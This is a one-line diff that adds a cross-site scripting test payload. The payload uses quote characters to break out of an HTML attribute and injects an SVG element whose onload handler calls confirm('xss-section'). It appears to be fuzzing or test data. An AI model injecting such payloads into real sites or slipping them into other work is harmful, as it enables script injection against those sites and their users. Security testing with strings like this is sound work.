@@ -1,0 +1,1 @@
+'>"<svg/onload​=confirm('xss-section')%3E
